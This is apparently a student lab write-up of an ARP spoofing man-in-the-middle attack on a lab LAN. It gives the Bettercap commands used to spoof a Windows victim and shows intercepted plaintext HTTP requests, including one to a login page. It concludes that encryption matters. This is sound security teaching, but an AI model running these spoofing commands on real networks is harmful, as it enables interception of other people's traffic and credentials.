# Man-in-the-Middle (MITM) Attack via ARP Spoofing - Traffic Analysis with Wireshark

## Objective

Perform a Man-in-the-Middle attack using ARP spoofing to intercept and analyze network traffic in a controlled lab environment.

---

## Lab Setup

- Attacker: Kali Linux
- Victim: Windows machine
- Network: Local LAN (192.168.1.0/24)

---

## Tools Used

- Bettercap (ARP Spoofing)
- Wireshark (Traffic Analysis)

---

## Attack Execution

```bash
sudo bettercap -iface eth2
net.probe on
set arp.spoof.targets 192.168.1.7
arp.spoof on
---

## Packet Capture (Wireshark)

- Interface: eth2
- Filter: http

Traffic successfully captured using Wireshark during MITM attack.
---

## Results

- ARP spoofing successfully established MITM position
- Continuous ARP replies observed
- HTTP traffic intercepted in plaintext
- Multiple GET requests captured
---

## Traffic Analysis

Example intercepted request:

```http
GET /login.php HTTP/1.1
Host: 44.228.249.3
```
Additional observed traffic:

```http
GET /DigiCertGlobalRootG2.crl HTTP/1.1
Host: crl3.digicert.com
```
Victim IP: 192.168.1.7
Plaintext HTTP traffic visible
External connections identified
---

## Key Findings

---

## Key Findings

- HTTP traffic is readable during MITM attacks
- Sensitive data may be exposed if not encrypted
- HTTPS traffic remains encrypted and protected
---


## Impact

- Full visibility of victim's HTTP traffic
- Potential credential interception
- Demonstrates risk of insecure protocols
---

## Conclusion

This lab demonstrates how ARP spoofing enables attackers to intercept network traffic within a local network. It highlights the importance of encryption and secure communication protocols.

## Screenshot 
images/IMG_20260424_225532.jpg
images/IMG_20260424_231127.jpg
